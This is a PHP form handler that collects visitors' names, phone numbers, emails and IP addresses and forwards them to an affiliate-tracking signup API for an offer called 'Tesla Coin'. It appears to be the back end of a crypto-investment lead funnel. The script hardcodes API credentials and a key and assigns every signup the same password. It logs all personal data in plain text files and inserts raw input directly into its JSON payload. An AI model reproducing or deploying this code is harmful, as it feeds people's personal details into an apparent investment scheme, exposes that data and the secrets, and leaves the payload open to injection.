<?php


$curl = curl_init();

$ip = $_SERVER['REMOTE_ADDR'];
$fio = $_POST['name'];
$phone = $_POST['phone'];
$numberCode = $_POST['numberCode'];
$lastname = $_POST['lastname'];
$email = $_POST['email'];
$pass = 'Aa123456';
$ai = '2958077';
$gi = '54';
$ci = '1';
$so = 'Tesla Coin';
$phoneAndCode = $numberCode . $phone;

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://fg.trafficvision.network/api/signup/procform',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>"{
    'ai': $ai,
    'ci': $ci,
    'gi': $gi,
    'userip': '$ip',
    'firstname': '$fio',
    'phone': '$phoneAndCode',
    'lastname': '$lastname',
    'email': '$email',
    'password': '$pass',
    'so': '$so'
}",
    CURLOPT_HTTPHEADER => array(
        'x-trackbox-username: internalOB',
        'x-trackbox-password: Aa123456',
        'x-api-key: 2643889w34df345676ssdas323tgc738',
        'Content-Type: application/json'
    ),
));


$response = curl_exec($curl);

$time = date('Y-m-d H:i:s');
$message = "$time;$ip;$fio;$phoneAndCode;$lastname;$email;$pass;$so;$response\n";
file_put_contents($response ? 'log.txt' : 'error.txt', $message, FILE_APPEND | LOCK_EX);

curl_close($curl);
// echo $response;

$response ? header("Location: success.html") : header("Location: home.html");

?>